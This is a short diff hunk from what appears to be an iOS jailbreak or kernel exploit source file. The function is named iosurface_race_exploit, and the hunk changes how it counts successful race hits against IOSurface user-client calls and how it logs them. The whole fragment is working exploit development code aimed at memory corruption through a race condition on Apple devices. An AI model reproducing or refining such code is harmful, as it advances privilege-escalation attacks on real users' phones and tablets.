@@ -37848,6 +37848,7 @@ void iosurface_race_exploit(ISRLogBlock log, ISRDoneBlock done) {
                     int reg = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     if (reg != 0) { jb41_dropPort(wp); continue; }
                     __block volatile int raceDone = 0;
+                    __block volatile int localHits = 0;
                     unsigned int *gPorts5 = (unsigned int *)calloc(512, sizeof(unsigned int));
                     __block int gCount5 = 0;
                     dispatch_group_t grp = dispatch_group_create();
@@ -37871,14 +37872,15 @@ void iosurface_race_exploit(ISRLogBlock log, ISRDoneBlock done) {
                                 if (outBuf[b] != 0xCC) { changed = 1; break; }
                             }
                             if (changed) {
-                                i5BytesWritten++;
+                                localHits++;
                             }
                             (void)rc;
                         }
                     });
                     dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
                     raceDone = 1;
-                    if (i5BytesWritten > 0) {
+                    i5BytesWritten += localHits;
+                    if (localHits > 0) {
                         log([NSString stringWithFormat:@"JB46: [I5] outSz=%d DATA WRITTEN", outSz]);
                     } else {
                         log([NSString stringWithFormat:@"JB46: [I5] outSz=%d no data", outSz]);
